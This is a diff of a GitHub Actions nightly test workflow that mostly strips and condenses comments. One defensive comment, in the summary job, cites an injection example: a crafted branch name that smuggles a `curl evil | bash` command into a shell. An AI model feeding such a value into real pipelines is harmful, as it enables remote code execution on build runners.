@@ -1,17 +1,6 @@
 name: Nightly Full Test Suite
 
-# Runs the ENTIRE test surface - every xUnit bucket (Unit, Security,
-# Performance) plus the Docker end-to-end suite - once a day, and on demand.
-#
-# Why this exists: the per-PR workflows (pr.yml, e2e.yml) are tuned for speed -
-# Performance tests are allowed to soft-fail on PRs, and nothing runs on a
-# schedule. This workflow is the "belt and suspenders" full run: nothing is
-# skipped, nothing soft-fails, so a regression that only shows up in the
-# performance bucket or the full e2e stack is caught within 24h even if no PR
-# touched the area.
-#
-# Manual runs (workflow_dispatch) take a `branch` input so you can point the
-# full suite at ANY branch - not just the default one the schedule uses.
+# Runs the ENTIRE test surface - every xUnit bucket (Unit, Security, Performance) plus the Docker end-to-end suite - once a day, and on demand.
 
 on:
   schedule:
@@ -35,7 +24,6 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
-  # --- unit / security / performance (xUnit) --------------------------------
   dotnet-tests:
     name: "xUnit (${{ matrix.bucket.name }})"
     runs-on: ubuntu-latest
@@ -96,7 +84,6 @@ jobs:
           path: "**/TestResults/**/*.trx"
           retention-days: 14
 
-  # --- end-to-end (Docker + real Jellyfin 12 + mock Arr/Seerr) --------------
   e2e:
     name: E2E (Docker)
     runs-on: ubuntu-latest
@@ -162,7 +149,6 @@ jobs:
           docker logs jfh-e2e-mock-seerr 2>&1 | tail -100 || true
           echo "::endgroup::"
 
-  # --- roll-up gate: one red check if anything above failed -----------------
   nightly-summary:
     name: Nightly result
     runs-on: ubuntu-latest
@@ -171,9 +157,7 @@ jobs:
     steps:
       - name: Report combined result
         env:
-          # Route the free-form workflow_dispatch input through an env var so it is
-          # treated as data, never re-evaluated by the shell (avoids injection via a
-          # crafted branch name like `x"; curl evil | bash; echo "`).
+          # Route the free-form workflow_dispatch input through an env var so it is treated as data, never re-evaluated by the shell (avoids injection via a crafted branch name like `x"; curl evil | bash; echo "`).
           TARGET_REF: ${{ inputs.branch || github.ref }}
         run: |
           echo "## Nightly full test suite" >> "$GITHUB_STEP_SUMMARY"
